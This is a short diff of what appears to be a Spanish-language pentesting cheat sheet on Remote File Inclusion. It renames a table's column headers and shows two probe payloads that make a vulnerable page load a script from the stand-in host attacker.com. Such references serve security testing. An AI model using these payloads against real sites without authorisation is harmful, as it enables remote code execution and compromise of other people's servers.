@@ -47,7 +47,7 @@ ___
 
 ## Probes con URL Remota
 
-| **Probe** | **Payload** | **Indicador** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Basic HTTP | `?page=http://attacker.com/test.php` | If executed → RFI active. |
 | HTTPS | `?page=https://attacker.com/test.php` | TLS variant. |
